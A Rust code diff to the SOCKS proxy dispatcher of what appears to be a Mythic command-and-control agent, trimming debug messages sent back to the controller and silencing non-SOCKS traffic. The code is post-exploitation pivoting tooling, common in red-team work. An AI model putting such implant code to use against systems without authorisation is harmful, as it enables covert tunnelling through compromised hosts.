@@ -462,15 +462,15 @@ pub fn handle_socks(
         while let Some(raw_msg) = bridge_rx.recv().await {
             match extract_socks_packet(&raw_msg) {
                 Ok(Some((server_id, exit, socks_msg))) => {
-                    // Lazily create a session for this server_id
+                    // Lazily create route & forward, as you already do
                     let entry = sessions.entry(server_id.clone()).or_insert_with(|| {
                         let (sess_tx, sess_rx) = tokio_mpsc::unbounded_channel();
                         let sid = server_id.clone();
                         let tx_out = tx.clone();
                         let parent_id = parent_task_id.clone();
-
+            
                         debug_to_mythic(&tx_out, &parent_id, "SOCKS session spawn", format!("server_id={sid}"));
-
+            
                         tokio::spawn(async move {
                             if let Err(e) = handle_connection(parent_id, sid, sess_rx, tx_out).await {
                                 eprintln!("socks session ended with error: {e}");
@@ -478,36 +478,22 @@ pub fn handle_socks(
                         });
                         sess_tx
                     });
-
-                    // Forward the (possibly transformed) socks message to the session
+            
                     let _ = entry.send(socks_msg);
-
-                    // If this message indicates exit, drop the route
+            
                     if exit {
                         sessions.remove(&server_id);
                         debug_to_mythic(&tx, &parent_task_id, "SOCKS dispatcher removed session", format!("server_id={server_id}"));
                     }
                 }
-                Ok(None) => {
-                    // Not a socks packet; log once in a while to avoid spam
-                    debug_to_mythic(
-                        &tx,
-                        &parent_task_id,
-                        "SOCKS dispatcher skip",
-                        "message not socks-related (no server_id / not continued_task)",
-                    );
-                }
+                // Non-SOCKS: ignore silently to avoid flooding (these are the Mythic acks you saw)
+                Ok(None) => {}
+                // We should rarely get here now; still keep a single-line stderr for visibility
                 Err(e) => {
-                    // We tried to parse parameters but failed; include a small preview
-                    let preview = raw_msg.get("parameters").and_then(|v| v.as_str()).map(|s| str_preview(s, 160)).unwrap_or_default();
-                    debug_to_mythic(
-                        &tx,
-                        &parent_task_id,
-                        "SOCKS dispatcher parse error",
-                        format!("err={e}; params_preview={preview}"),
-                    );
+                    eprintln!("SOCKS extractor unexpected error: {e}");
                 }
             }
+
         }
 
         debug_to_mythic(&tx, &parent_task_id, "SOCKS dispatcher ended", "bridge_rx closed; dropping all sessions");
